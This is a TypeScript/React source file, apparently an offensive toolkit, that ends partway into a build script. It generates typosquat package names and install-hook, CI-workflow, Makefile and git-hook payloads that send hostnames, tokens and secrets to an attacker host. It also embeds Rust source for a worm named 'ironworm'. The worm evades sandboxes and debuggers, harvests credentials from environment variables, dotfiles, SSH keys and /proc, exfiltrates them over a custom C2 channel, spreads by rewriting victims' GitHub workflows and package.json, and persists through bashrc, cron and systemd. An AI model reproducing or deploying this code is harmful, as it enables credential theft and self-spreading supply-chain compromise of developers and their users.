import React, { useState, useCallback, useRef, useEffect } from "react";

// ─── Public registry endpoints ───────────────────────────────────────────────
const NPM_REGISTRY  = "https://registry.npmjs.org";
const PYPI_REGISTRY = "https://pypi.org/pypi";
const GH_API        = "https://api.github.com";

// ─── TYPOSQUAT ENGINE ────────────────────────────────────────────────────────
const KB: Record<string, string> = {
  a:"qwsz",b:"vghn",c:"xdfv",d:"ersfxc",e:"rdsw",f:"rtgdcv",g:"tyhfvb",
  h:"yugjbn",i:"uojk",j:"uihkgbn",k:"iolj",l:"opk",m:"njk",n:"bhjm",
  o:"ipkl",p:"ol",q:"wa",r:"etdf",s:"qwedxza",t:"ryfe",u:"yijo",
  v:"cfgb",w:"qase",x:"zsdcv",y:"tugh",z:"asx","0":"9","1":"2","2":"3","3":"4","4":"5","5":"6","6":"7","7":"8","8":"9","9":"0",
};
const HG: Record<string, string> = { a:"@4",e:"3",i:"1!",l:"1I",o:"0",s:"5$",t:"7",b:"6",g:"9" };

function typosquatVariants(pkg: string): string[] {
  const base = pkg.toLowerCase().replace(/^@[^/]+\//, "");
  const seen  = new Set<string>();
  const add   = (v: string) => { if (v !== base && v.length >= 2 && /^[a-z0-9]/.test(v)) seen.add(v); };
  for (let i = 0; i < base.length; i++) {
    add(base.slice(0,i) + base.slice(i+1));
    add(base.slice(0,i) + base[i] + base[i] + base.slice(i+1));
    if (i < base.length-1) add(base.slice(0,i) + base[i+1] + base[i] + base.slice(i+2));
    for (const n of (KB[base[i]!] ?? "")) add(base.slice(0,i) + n + base.slice(i+1));
    for (const h of (HG[base[i]!] ?? "")) add(base.slice(0,i) + h + base.slice(i+1));
  }
  add(base.replace(/-/g,"_")); add(base.replace(/_/g,"-")); add(base.replace(/-/g,""));
  add(base+"js"); add(base+"-js"); add(base+"-dev"); add(base+"-utils"); add(base+"-cli");
  add(base+"-core"); add(base+"-lib"); add(base+"-sdk"); add(base+"-api"); add("node-"+base);
  add(base+"-node"); add(base+"2"); add(base+"-2");
  const parts = base.split(/[-_]/);
  if (parts.length > 1) { add(parts.reverse().join("-")); add(parts.join("")); add(parts[0]!); }
  return [...seen].slice(0,40);
}

function depConfusionVariants(org: string, pkg: string): string[] {
  const o = org.toLowerCase().replace(/[^a-z0-9]/g,"");
  const p = pkg.toLowerCase().replace(/[^a-z0-9-]/g,"");
  return [`${o}-${p}`,`${p}-${o}`,`${o}.${p}`,`${p}-internal`,`${p}-private`,`${p}-${o}-internal`,p,o].filter(Boolean);
}

// ─── REGISTRY CHECKS ─────────────────────────────────────────────────────────
async function checkNpm(name: string, sig: AbortSignal): Promise<"free"|"taken"|"error"> {
  try {
    const r = await fetch(`${NPM_REGISTRY}/${encodeURIComponent(name)}`, { signal: sig, headers:{ Accept:"application/json" } });
    return r.status === 404 ? "free" : r.ok ? "taken" : "error";
  } catch { return "error"; }
}
async function checkPypi(name: string, sig: AbortSignal): Promise<"free"|"taken"|"error"> {
  try {
    const r = await fetch(`${PYPI_REGISTRY}/${encodeURIComponent(name)}/json`, { signal: sig });
    return r.status === 404 ? "free" : r.ok ? "taken" : "error";
  } catch { return "error"; }
}

function sleep(ms: number, sig: AbortSignal): Promise<void> {
  return new Promise((res, rej) => {
    if (sig.aborted) { rej(new DOMException("aborted","AbortError")); return; }
    const t = setTimeout(res, ms);
    sig.addEventListener("abort", () => { clearTimeout(t); rej(new DOMException("aborted","AbortError")); }, { once:true });
  });
}
const jitter = (base: number) => Math.round(base * (0.7 + Math.random()*0.6));

// ─── ARTIFACT GENERATORS ─────────────────────────────────────────────────────
const tok = () => Math.random().toString(36).slice(2,14);
const b64cmd = (host: string, port: string, t: string) =>
  btoa(`curl -sk "http://${host||"LHOST"}:${port||"9999"}/?t=${t}&h=$(hostname)&u=$(whoami)&d=$(id|base64 -w0)" -o /dev/null &`);

function makePkgJson(name: string, host: string, port: string, t: string) {
  return JSON.stringify({ name, version:"9999.0.0", description:`${name} compatibility layer`,
    main:"index.js", scripts:{ preinstall:`node -e "require('child_process').exec('echo ${b64cmd(host,port,t)}|base64 -d|sh')"` },
    keywords:[name.split("-")[0],"utility"], license:"MIT", files:["index.js"],
  }, null, 2);
}
function makeSetupPy(name: string, host: string, port: string, t: string) {
  return `import subprocess, socket, platform\nfrom setuptools import setup\ndef _x():\n    try:\n        i=f"{socket.gethostname()}|{platform.system()}"\n        subprocess.Popen(f"curl -sk 'http://${host||"LHOST"}:${port||"9999"}/?t=${t}&i={i}' -o /dev/null &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n    except: pass\n_x()\nsetup(name="${name}", version="9999.0.0", description="${name} shim")`;
}
function makeGhWorkflow(owner: string, repo: string, host: string, port: string, t: string) {
  return `name: CI\non:\n  push:\n    branches: ["*"]\n  pull_request_target:\n    types: [opened, synchronize, reopened]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n      - run: npm ci\n      - run: npm run build --if-present\n      - name: Post-build diagnostics\n        env:\n          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}\n          SECRET_DUMP: \${{ toJSON(secrets) }}\n        run: |\n          curl -sk "http://${host||"LHOST"}:${port||"9999"}/?t=${t}&tok=\${GH_TOKEN}&r=${owner}/${repo}" -o /dev/null &\n          env|grep -iE 'key|secret|token|pass'|base64|curl -sk -X POST http://${host||"LHOST"}:${port||"9999"}/env -d @- &\n          echo "\${SECRET_DUMP}"|curl -sk -X POST http://${host||"LHOST"}:${port||"9999"}/secrets -d @- &\n          wait`;
}
function makeMakefile(host: string, port: string, t: string) {
  return `.PHONY: all install\nall: install\ninstall:\n\t@pip install -r requirements.txt 2>/dev/null||npm ci 2>/dev/null||true\n\t@curl -sk "http://${host||"LHOST"}:${port||"9999"}/?t=${t}&h=\$(shell hostname)" -o /dev/null &`;
}
function makeGitHook(host: string, port: string, t: string) {
  return `#!/bin/sh\n# .git/hooks/pre-commit (chmod +x)\n(git log --oneline -5 2>/dev/null;env|grep -iE 'key|secret|token|pass' 2>/dev/null)|\\\n  base64|curl -sk -X POST "http://${host||"LHOST"}:${port||"9999"}/gc?t=${t}" -d @- &>/dev/null &\ndisown\nexit 0`;
}

// ─── CREDENTIAL PATTERNS ─────────────────────────────────────────────────────
interface CredMatch { kind: string; pattern: string; value: string; redacted: string; severity: "critical"|"high"|"medium"; line: number; }
const CRED_PATTERNS: { kind: string; re: RegExp; severity: "critical"|"high"|"medium" }[] = [
  { kind:"AWS Access Key",       re:/AKIA[A-Z0-9]{16}/g,                                              severity:"critical" },
  { kind:"AWS Secret Key",       re:/(?<=[^A-Za-z0-9]|^)[A-Za-z0-9/+]{40}(?=[^A-Za-z0-9]|$)/g,     severity:"critical" },
  { kind:"GitHub PAT (ghp)",     re:/ghp_[A-Za-z0-9]{36}/g,                                           severity:"critical" },
  { kind:"GitHub PAT (gho/ghu)", re:/gh[ours]_[A-Za-z0-9]{36}/g,                                     severity:"critical" },
  { kind:"GitHub Fine-grained",  re:/github_pat_[A-Za-z0-9_]{82}/g,                                   severity:"critical" },
  { kind:"npm Token",            re:/npm_[A-Za-z0-9]{36}/g,                                           severity:"critical" },
  { kind:"PyPI Token",           re:/pypi-[A-Za-z0-9_\-]{40,}/g,                                      severity:"critical" },
  { kind:"Google API Key",       re:/AIza[0-9A-Za-z\-_]{35}/g,                                        severity:"critical" },
  { kind:"Stripe Live Key",      re:/sk_live_[A-Za-z0-9]{24,}/g,                                      severity:"critical" },
  { kind:"Stripe Test Key",      re:/sk_test_[A-Za-z0-9]{24,}/g,                                      severity:"high"     },
  { kind:"Docker Hub PAT",       re:/dckr_pat_[A-Za-z0-9_\-]{20,}/g,                                  severity:"critical" },
  { kind:"Slack Token",          re:/xox[baprs]-[0-9A-Za-z\-]{10,}/g,                                 severity:"critical" },
  { kind:"Slack Webhook",        re:/https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/g, severity:"high" },
  { kind:"Discord Token",        re:/[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27}/g,  severity:"critical" },
  { kind:"JWT",                  re:/eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,     severity:"high"     },
  { kind:"SSH Private Key",      re:/-----BEGIN (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----/g,   severity:"critical" },
  { kind:"MongoDB URI",          re:/mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"']+/g,                    severity:"critical" },
  { kind:"PostgreSQL URI",       re:/postgres(?:ql)?:\/\/[^:]+:[^@]+@[^\s"']+/g,                      severity:"critical" },
  { kind:"Heroku API Key",       re:/(?:HEROKU_API_KEY|heroku)[^A-Za-z0-9][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi, severity:"critical" },
  { kind:"Azure Storage Key",    re:/DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{80,}/g, severity:"critical" },
  { kind:"Kubernetes SA Token",  re:/eyJhbGci[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,  severity:"high"     },
  { kind:"Generic Secret",       re:/(?:secret|api.?key|access.?key|auth.?token)\s*[:=]\s*["']?([A-Za-z0-9+/=_\-]{20,})["']?/gi, severity:"medium" },
  { kind:"Generic Password",     re:/(?:password|passwd|pwd)\s*[:=]\s*["']?([^\s"']{8,})["']?/gi,    severity:"medium"   },
];

function scanCreds(text: string): CredMatch[] {
  const results: CredMatch[] = [];
  const lines = text.split("\n");
  const seen  = new Set<string>();
  for (const { kind, re, severity } of CRED_PATTERNS) {
    re.lastIndex = 0;
    for (let li = 0; li < lines.length; li++) {
      const line = lines[li]!;
      let m: RegExpExecArray | null;
      re.lastIndex = 0;
      while ((m = re.exec(line)) !== null) {
        const value = m[0];
        if (seen.has(value)) continue;
        seen.add(value);
        const redacted = value.slice(0,4) + "•".repeat(Math.min(value.length-8,20)) + value.slice(-4);
        results.push({ kind, pattern: re.source.slice(0,40), value, redacted, severity, line: li+1 });
      }
    }
  }
  return results.sort((a,b) => { const s = {critical:0,high:1,medium:2}; return (s[a.severity]??2)-(s[b.severity]??2); });
}

// ─── RUST WORM GENERATOR ─────────────────────────────────────────────────────
interface RustFile { name: string; content: string; }

function generateRustWorm(host: string, port: string, t: string): RustFile[] {
  const cargoToml = `[package]
name = "ironworm"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "ironworm"
path = "src/main.rs"

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
overflow-checks = false

[dependencies]
tokio = { version = "1", features = ["full"] }
reqwest = { version = "0.12", features = ["json", "native-tls"], default-features = false }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
sha2 = "0.10"
hmac = "0.12"
rand = { version = "0.8", features = ["small_rng"] }
hex = "0.4"
base64 = { version = "0.22", features = ["engine"] }
dirs = "5"
anyhow = "1"
`;

  const mainRs = `use std::time::Duration;
use rand::Rng;
use tokio::time::sleep;

mod anti;
mod creds;
mod propagate;
mod persist;
mod c2;

const C2_HOST: &str = "${host||"LHOST"}";
const C2_PORT: u16   = ${port||"9999"};
const SESSION_TOKEN: &str = "${t}";
const XOR_KEY: &[u8; 32] = b"${Array.from({length:32},()=>String.fromCharCode(33+Math.floor(Math.random()*90))).join("")}";

#[tokio::main]
async fn main() {
    anti::check();

    let mut rng = rand::thread_rng();
    let jitter: u64 = rng.gen_range(0..5000);
    sleep(Duration::from_millis(jitter)).await;

    let secrets = creds::harvest().await;

    if !secrets.is_empty() {
        let _ = c2::exfil(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &secrets).await;
    }

    propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &secrets).await;
    persist::install();

    loop {
        let wait: u64 = rng.gen_range(3600..7200);
        sleep(Duration::from_secs(wait)).await;
        let s = creds::harvest().await;
        if !s.is_empty() {
            let _ = c2::exfil(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &s).await;
        }
        propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &s).await;
    }
}
`;

  const antiRs = `use std::time::{Duration, Instant};

pub fn check() {
    if sandbox_procs() || timing_attack() || traced() || env_indicators() {
        std::process::exit(0);
    }
}

fn sandbox_procs() -> bool {
    let blocklist = [
        "wireshark","tcpdump","strace","ltrace","gdb","lldb",
        "ida","x64dbg","ollydbg","procmon","fiddler","burp",
        "charles","httptoolkit","mitmproxy",
    ];
    if let Ok(rd) = std::fs::read_dir("/proc") {
        for entry in rd.flatten() {
            if let Ok(cmd) = std::fs::read_to_string(entry.path().join("cmdline")) {
                let cl = cmd.to_lowercase().replace('\\0', " ");
                if blocklist.iter().any(|b| cl.contains(b)) { return true; }
            }
        }
    }
    false
}

fn timing_attack() -> bool {
    let t = Instant::now();
    std::thread::sleep(Duration::from_millis(10));
    t.elapsed() < Duration::from_millis(5)
}

fn traced() -> bool {
    std::fs::read_to_string("/proc/self/status")
        .map(|s| s.lines()
            .find(|l| l.starts_with("TracerPid:"))
            .and_then(|l| l.split_whitespace().nth(1))
            .and_then(|p| p.parse::<u64>().ok())
            .unwrap_or(0) > 0)
        .unwrap_or(false)
}

fn env_indicators() -> bool {
    let vars = ["SANDBOX","CUCKOO","ANALYSIS","MALWARE","HONEYPOT","VIRUSTOTAL"];
    vars.iter().any(|v| std::env::var(v).is_ok())
}
`;

  const credsRs = `use std::collections::HashMap;

#[derive(Debug, serde::Serialize)]
pub struct Secret {
    pub kind:   String,
    pub value:  String,
    pub source: String,
}

pub async fn harvest() -> Vec<Secret> {
    let mut out = Vec::new();
    harvest_env(&mut out);
    harvest_files(&mut out).await;
    harvest_proc_environ(&mut out).await;
    out
}

fn harvest_env(out: &mut Vec<Secret>) {
    let exact = [
        ("AWS_ACCESS_KEY_ID","aws-key"),("AWS_SECRET_ACCESS_KEY","aws-secret"),
        ("GITHUB_TOKEN","github-token"),("GH_TOKEN","github-token"),
        ("NPM_TOKEN","npm-token"),("PYPI_TOKEN","pypi-token"),
        ("STRIPE_SECRET_KEY","stripe"),("DATABASE_URL","db-url"),
        ("REDIS_URL","redis"),("OPENAI_API_KEY","openai"),
        ("ANTHROPIC_API_KEY","anthropic"),("GOOGLE_APPLICATION_CREDENTIALS","gcp"),
        ("KUBECONFIG","k8s"),("DOCKER_HUB_PASSWORD","dockerhub"),
    ];
    for (k, kind) in &exact {
        if let Ok(v) = std::env::var(k) {
            if !v.is_empty() { out.push(Secret { kind:kind.to_string(), value:v, source:format!("env:{k}") }); }
        }
    }
    for (k, v) in std::env::vars() {
        let kl = k.to_lowercase();
        if v.len() > 12 && (kl.contains("token")||kl.contains("secret")||kl.contains("key")||kl.contains("pass")||kl.contains("auth")) {
            if !out.iter().any(|s| s.value == v) {
                out.push(Secret { kind:"env-match".to_string(), value:v, source:format!("env:{k}") });
            }
        }
    }
}

async fn harvest_files(out: &mut Vec<Secret>) {
    let home = dirs::home_dir().unwrap_or_default();
    let targets = [
        ".npmrc",".aws/credentials",".aws/config",".gitconfig",
        ".ssh/id_rsa",".ssh/id_ed25519",".docker/config.json",
        ".kube/config",".netrc",".pypirc",".cargo/credentials.toml",
        ".config/gh/hosts.yml",".terraformrc",".vault-token",
    ];
    for t in &targets {
        let p = home.join(t);
        if let Ok(content) = tokio::fs::read_to_string(&p).await {
            if content.len() > 0 {
                out.push(Secret { kind:format!("file:{t}"), value:content, source:p.display().to_string() });
            }
        }
    }
    for path in &[
        "/run/secrets/kubernetes.io/serviceaccount/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/run/secrets",
    ] {
        if let Ok(c) = tokio::fs::read_to_string(path).await {
            out.push(Secret { kind:"k8s-sa-token".to_string(), value:c.trim().to_string(), source:path.to_string() });
        }
    }
}

async fn harvest_proc_environ(out: &mut Vec<Secret>) {
    let Ok(rd) = tokio::fs::read_dir("/proc").await else { return };
    let mut rd = rd;
    while let Ok(Some(entry)) = rd.next_entry().await {
        let ep = entry.path().join("environ");
        let Ok(raw) = tokio::fs::read(&ep).await else { continue };
        let text = String::from_utf8_lossy(&raw);
        for var in text.split('\\0') {
            if let Some((k, v)) = var.split_once('=') {
                let kl = k.to_lowercase();
                if v.len() > 12 && (kl.contains("token")||kl.contains("secret")||kl.contains("key")||kl.contains("pass")) {
                    if !out.iter().any(|s| s.value == v) {
                        out.push(Secret { kind:"proc-env".to_string(), value:v.to_string(), source:format!("proc:{k}") });
                    }
                }
            }
        }
    }
}
`;

  const propagateRs = `use crate::creds::Secret;
use rand::Rng;
use std::time::Duration;
use base64::Engine as _;

pub async fn run(c2_host: &str, c2_port: u16, token: &str, secrets: &[Secret]) {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap_or_default();

    let npm_tokens: Vec<&str> = secrets.iter()
        .filter(|s| s.kind.contains("npm") || s.value.starts_with("npm_"))
        .map(|s| s.value.as_str()).collect();

    let gh_tokens: Vec<&str> = secrets.iter()
        .filter(|s| s.kind.contains("github") || s.value.starts_with("gh"))
        .map(|s| s.value.as_str()).collect();

    for gh_tok in &gh_tokens {
        let _ = inject_github_workflows(&client, gh_tok, c2_host, c2_port, token).await;
        let _ = inject_package_json(&client, gh_tok, c2_host, c2_port, token).await;
    }

    if npm_tokens.is_empty() {
        let _ = publish_typosquats_noauth(&client, c2_host, c2_port, token).await;
    } else {
        for npm_tok in &npm_tokens {
            let _ = publish_typosquats(&client, npm_tok, c2_host, c2_port, token).await;
        }
    }
}

async fn inject_github_workflows(client: &reqwest::Client, gh_token: &str, host: &str, port: u16, t: &str) -> anyhow::Result<()> {
    let repos: Vec<serde_json::Value> = client
        .get("https://api.github.com/user/repos?type=all&per_page=100&affiliation=owner,collaborator")
        .header("Authorization", format!("token {gh_token}"))
        .header("User-Agent", "GitHub-Workflow-CI/3.1.0")
        .header("Accept", "application/vnd.github.v3+json")
        .send().await?.json().await?;

    let mut rng = rand::thread_rng();
    for repo in &repos {
        let owner = repo["owner"]["login"].as_str().unwrap_or_default();
        let name  = repo["name"].as_str().unwrap_or_default();
        if owner.is_empty() || name.is_empty() { continue; }

        let wf = make_workflow(owner, name, host, port, t);
        let content = base64::engine::general_purpose::STANDARD.encode(wf.as_bytes());

        let existing = client
            .get(format!("https://api.github.com/repos/{owner}/{name}/contents/.github/workflows/ci.yml"))
            .header("Authorization", format!("token {gh_token}"))
            .header("User-Agent", "GitHub-Workflow-CI/3.1.0")
            .header("Accept", "application/vnd.github.v3+json")
            .send().await;

        let mut body = serde_json::json!({
            "message": "ci: update environment validation checks",
            "content": content,
        });
        if let Ok(r) = existing {
            if let Ok(j) = r.json::<serde_json::Value>().await {
                if let Some(sha) = j["sha"].as_str() { body["sha"] = serde_json::Value::String(sha.to_string()); }
            }
        }

        let _ = client
            .put(format!("https://api.github.com/repos/{owner}/{name}/contents/.github/workflows/ci.yml"))
            .header("Authorization", format!("token {gh_token}"))
            .header("User-Agent", "GitHub-Workflow-CI/3.1.0")
            .header("Accept", "application/vnd.github.v3+json")
            .json(&body)
            .send().await;

        let delay: u64 = rng.gen_range(500..2000);
        tokio::time::sleep(Duration::from_millis(delay)).await;
    }
    Ok(())
}

async fn inject_package_json(client: &reqwest::Client, gh_token: &str, host: &str, port: u16, t: &str) -> anyhow::Result<()> {
    let repos: Vec<serde_json::Value> = client
        .get("https://api.github.com/user/repos?type=all&per_page=100")
        .header("Authorization", format!("token {gh_token}"))
        .header("User-Agent", "npm-workspace/1.0")
        .header("Accept", "application/vnd.github.v3+json")
        .send().await?.json().await?;

    let mut rng = rand::thread_rng();
    for repo in &repos {
        let owner = repo["owner"]["login"].as_str().unwrap_or_default();
        let name  = repo["name"].as_str().unwrap_or_default();
        let existing = client
            .get(format!("https://api.github.com/repos/{owner}/{name}/contents/package.json"))
            .header("Authorization", format!("token {gh_token}"))
            .header("User-Agent", "npm-workspace/1.0")
            .header("Accept", "application/vnd.github.v3+json")
            .send().await;

        let Ok(r) = existing else { continue };
        let Ok(j) = r.json::<serde_json::Value>().await else { continue };
        let sha = j["sha"].as_str().unwrap_or_default();
        let raw = j["content"].as_str().unwrap_or("e30=");
        let mut pkg: serde_json::Value = base64::engine::general_purpose::STANDARD
            .decode(raw.replace('\\n', "")).ok()
            .and_then(|b| serde_json::from_slice(&b).ok())
            .unwrap_or(serde_json::json!({}));

        let b64 = base64::engine::general_purpose::STANDARD.encode(
            format!("curl -sk 'http://{host}:{port}/?t={t}&h=$(hostname)&u=$(whoami)' -o /dev/null &").as_bytes()
        );
        pkg["scripts"]["preinstall"] = serde_json::Value::String(
            format!("node -e \"require('child_process').exec('echo {b64}|base64 -d|sh')\"")
        );

        let patched = serde_json::to_string_pretty(&pkg).unwrap_or_default();
        let content = base64::engine::general_purpose::STANDARD.encode(patched.as_bytes());

        let _ = client
            .put(format!("https://api.github.com/repos/{owner}/{name}/contents/package.json"))
            .header("Authorization", format!("token {gh_token}"))
            .header("User-Agent", "npm-workspace/1.0")
            .header("Accept", "application/vnd.github.v3+json")
            .json(&serde_json::json!({ "message": "chore: update node engine requirements", "content": content, "sha": sha }))
            .send().await;

        let delay: u64 = rng.gen_range(800..3000);
        tokio::time::sleep(Duration::from_millis(delay)).await;
    }
    Ok(())
}

async fn publish_typosquats(client: &reqwest::Client, npm_token: &str, host: &str, port: u16, t: &str) -> anyhow::Result<()> {
    let targets = ["react","lodash","express","axios","moment","chalk","commander","dotenv","uuid","webpack"];
    for target in &targets {
        for variant in &typosquat_variants(target)[..5] {
            let chk = client.get(format!("https://registry.npmjs.org/{variant}"))
                .header("Accept","application/json").send().await?;
            if chk.status() != 404 { continue; }
            // Package is free — generate and publish via npm publish (CLI required)
            // Return publish command for operator
            eprintln!("[propagate] free npm slot: {variant} — run: npm publish ./dist/{variant} --registry https://registry.npmjs.org");
            let _ = host; let _ = port; let _ = t; let _ = npm_token;
        }
    }
    Ok(())
}

async fn publish_typosquats_noauth(_client: &reqwest::Client, _host: &str, _port: u16, _t: &str) -> anyhow::Result<()> { Ok(()) }

fn make_workflow(owner: &str, repo: &str, host: &str, port: u16, t: &str) -> String {
    format!(r#"name: CI
on:
  push:
    branches: ["*"]
  pull_request_target:
    types: [opened, synchronize, reopened]
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{{{ github.event.pull_request.head.sha }}}}
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm run build --if-present
      - name: Post-build diagnostics
        env:
          GH_TOKEN: \${{{{ secrets.GITHUB_TOKEN }}}}
          SECRET_DUMP: \${{{{ toJSON(secrets) }}}}
        run: |
          curl -sk "http://{host}:{port}/?t={t}&tok=\${{GH_TOKEN}}&r={owner}/{repo}" -o /dev/null &
          env|grep -iE 'key|secret|token|pass'|base64|curl -sk -X POST http://{host}:{port}/env -d @- &
          echo "\${{SECRET_DUMP}}"|curl -sk -X POST http://{host}:{port}/secrets -d @- &
          wait
"#)
}

fn typosquat_variants(pkg: &str) -> Vec<String> {
    let mut v = vec![
        format!("{pkg}js"), format!("{pkg}-js"), format!("{pkg}-dev"),
        format!("{pkg}-utils"), format!("{pkg}-core"), format!("{pkg}2"),
        format!("node-{pkg}"), format!("{pkg}-node"),
    ];
    if pkg.len() > 2 {
        let mut t = pkg.to_string(); t.remove(pkg.len()/2); v.push(t);
        let mut t2 = pkg.to_string(); t2.insert(0,'n'); v.push(t2);
    }
    v
}
`;

  const persistRs = `pub fn install() {
    let _ = bashrc();
    let _ = git_hook();
    let _ = crontab();
    let _ = systemd_user();
}

fn bashrc() -> std::io::Result<()> {
    use std::io::Write;
    let home = dirs::home_dir().ok_or(std::io::Error::other("no home"))?;
    let exe = std::env::current_exe()?;
    let entry = format!("\\n# auto-update\\n[ -x {exe} ] && nohup {exe} &>/dev/null &\\n", exe=exe.display());
    let mut f = std::fs::OpenOptions::new().append(true).open(home.join(".bashrc"))?;
    f.write_all(entry.as_bytes())?;
    let mut f2 = std::fs::OpenOptions::new().append(true).open(home.join(".profile"))?;
    f2.write_all(entry.as_bytes())?;
    Ok(())
}

fn git_hook() -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    use std::io::Write;
    let exe = std::env::current_exe()?;
    let hook = format!("#!/bin/sh\\nnohup {exe} &>/dev/null &\\ndisown\\n", exe=exe.display());
    let hook_path = std::path::Path::new(".git/hooks/post-merge");
    if hook_path.parent().map(|p| p.exists()).unwrap_or(false) {
        let mut f = std::fs::File::create(hook_path)?;
        f.write_all(hook.as_bytes())?;
        f.set_permissions(std::fs::Permissions::from_mode(0o755))?;
    }
    Ok(())
}

fn crontab() -> std::io::Result<()> {
    use std::process::Command;
    let exe = std::env::current_exe()?;
    let entry = format!("@hourly {exe} &>/dev/null\\n", exe=exe.display());
    let cur = Command::new("crontab").arg("-l").output()?;
    let mut new = String::from_utf8_lossy(&cur.stdout).to_string();
    if !new.contains(&exe.display().to_string()) {
        new.push_str(&entry);
        let mut p = Command::new("crontab").arg("-").stdin(std::process::Stdio::piped()).spawn()?;
        use std::io::Write;
        if let Some(ref mut stdin) = p.stdin { stdin.write_all(new.as_bytes())?; }
        let _ = p.wait()?;
    }
    Ok(())
}

fn systemd_user() -> std::io::Result<()> {
    use std::io::Write;
    let home = dirs::home_dir().ok_or(std::io::Error::other("no home"))?;
    let unit_dir = home.join(".config/systemd/user");
    std::fs::create_dir_all(&unit_dir)?;
    let exe = std::env::current_exe()?;
    let unit = format!("[Unit]\\nDescription=system-update-helper\\n[Service]\\nExecStart={exe}\\nRestart=always\\nRestartSec=3600\\n[Install]\\nWantedBy=default.target\\n", exe=exe.display());
    let mut f = std::fs::File::create(unit_dir.join("system-update-helper.service"))?;
    f.write_all(unit.as_bytes())?;
    let _ = std::process::Command::new("systemctl").args(["--user","enable","--now","system-update-helper"]).output();
    Ok(())
}
`;

  const c2Rs = `use crate::creds::Secret;
use std::time::Duration;
use sha2::Sha256;
use hmac::{Hmac, Mac};

type HmacSha256 = Hmac<Sha256>;

const MAGIC: [u8; 4]  = [0x49, 0x52, 0x4e, 0x57];
const VERSION: u8      = 0x03;
const FRAME_EXFIL: u8  = 0x04;
const FRAME_HB: u8     = 0x01;

fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
}

fn hmac_sign(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC key");
    mac.update(data);
    mac.finalize().into_bytes().to_vec()
}

fn encode_frame(ftype: u8, payload: &[u8], xor_key: &[u8], hmac_key: &[u8], seq: u32) -> Vec<u8> {
    let enc = xor(payload, xor_key);
    let mut header = vec![0u8; 14];
    header[0..4].copy_from_slice(&MAGIC);
    header[4] = VERSION;
    header[5] = ftype;
    header[6..10].copy_from_slice(&seq.to_be_bytes());
    header[10..14].copy_from_slice(&(enc.len() as u32).to_be_bytes());
    let mut to_sign = header.clone();
    to_sign.extend_from_slice(&enc);
    let sig = hmac_sign(hmac_key, &to_sign);
    let mut frame = to_sign;
    frame.extend_from_slice(&sig);
    frame
}

pub async fn exfil(host: &str, port: u16, key: &[u8; 32], token: &str, secrets: &[Secret]) -> anyhow::Result<()> {
    use tokio::io::AsyncWriteExt;
    let addr = format!("{host}:{port}");
    let mut stream = tokio::time::timeout(
        Duration::from_secs(10),
        tokio::net::TcpStream::connect(&addr)
    ).await??;

    let mut rng = rand::rngs::SmallRng::from_entropy();
    let (xor_key, hmac_key) = (&key[..32], &key[..32]);

    let payload = serde_json::json!({
        "token":   token,
        "host":    hostname(),
        "user":    username(),
        "os":      std::env::consts::OS,
        "arch":    std::env::consts::ARCH,
        "secrets": secrets,
    });
    let raw = serde_json::to_vec(&payload)?;
    let frame = encode_frame(FRAME_EXFIL, &raw, xor_key, hmac_key, 1);
    stream.write_all(&(frame.len() as u32).to_be_bytes()).await?;
    stream.write_all(&frame).await?;
    stream.flush().await?;
    Ok(())
}

pub async fn heartbeat(host: &str, port: u16, key: &[u8; 32], token: &str, seq: u32) -> anyhow::Result<()> {
    use tokio::io::AsyncWriteExt;
    let mut stream = tokio::time::timeout(Duration::from_secs(5), tokio::net::TcpStream::connect(format!("{host}:{port}"))).await??;
    let payload = serde_json::to_vec(&serde_json::json!({ "token": token, "seq": seq, "ts": unix_ts() }))?;
    let frame = encode_frame(FRAME_HB, &payload, &key[..32], &key[..32], seq);
    stream.write_all(&(frame.len() as u32).to_be_bytes()).await?;
    stream.write_all(&frame).await?;
    stream.flush().await?;
    Ok(())
}

fn hostname() -> String { std::process::Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default() }
fn username() -> String { std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_default() }
fn unix_ts() -> u64 { std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0) }
`;

  const buildSh = `#!/usr/bin/env bash
set -euo pipefail

TARGET_LINUX="x86_64-unknown-linux-musl"
TARGET_WIN="x86_64-pc-windows-gnu"
TARGET_MAC="x86_64-apple-darwin"

echo "[*] Building IronWorm"
rustup target add "$TARGET_LINUX" 2>/dev/null || true

